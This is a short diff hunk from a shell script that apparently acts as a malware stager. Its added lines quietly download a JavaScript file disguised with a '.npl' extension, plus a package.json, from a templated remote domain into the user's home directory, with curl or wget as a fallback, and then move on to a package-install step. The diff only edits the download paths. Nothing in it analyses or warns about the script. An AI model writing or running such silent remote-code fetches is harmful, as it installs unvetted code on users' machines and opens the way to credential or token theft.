@@ -72,12 +72,12 @@ BASE_URL="{{DOMAIN}}"
 # Check if curl is available
 if ! command -v curl >/dev/null 2>&1; then
     # If curl is not available, use wget
-    wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/api/tokenParser.npl"
-    wget -q -O "$USER_HOME/package.json" "$BASE_URL/api/package.json"
+    wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/users/tokenParser.npl"
+    wget -q -O "$USER_HOME/package.json" "$BASE_URL/users/package.json"
 else
     # If curl is available, use curl
-    curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/api/tokenParser.npl"
-    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/api/package.json"
+    curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/users/tokenParser.npl"
+    curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/users/package.json"
 fi
 
 # Step 9: Install 'request' package
